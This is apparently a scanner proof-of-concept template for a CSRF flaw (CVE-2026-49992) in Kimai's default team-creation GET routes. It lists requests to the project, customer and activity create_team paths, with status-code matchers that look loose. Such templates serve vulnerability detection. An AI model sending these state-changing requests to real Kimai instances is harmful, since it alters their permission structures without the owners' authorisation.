[info]
author = "ave"
description = "检测 Kimai 默认团队创建快捷方式 CSRF 漏洞。受影响 GET 路由 /en/admin/project/{id}/create_team 等可直接创建团队、添加当前用户为团队负责人并绑定对象，攻击者可诱使已登录用户访问恶意页面导致未授权权限结构变更。"
id = "POC-AVE-2026-0332"
name = "Kimai Login CSRF in Default Team Creation Endpoints PoC"
severity = "medium"
tags = ["ave-2026-0332"]
vuln_id = [
    "CVE-2026-49992",
    "AVE-2026-0332",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/en/admin/project/1/create_team"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    302,
]
type = "status"

[[poc.requests]]
method = "GET"
path = "/en/admin/customer/1/create_team"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    302,
]
type = "status"

[[poc.requests]]
method = "GET"
path = "/en/admin/activity/1/create_team"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    302,
]
type = "status"
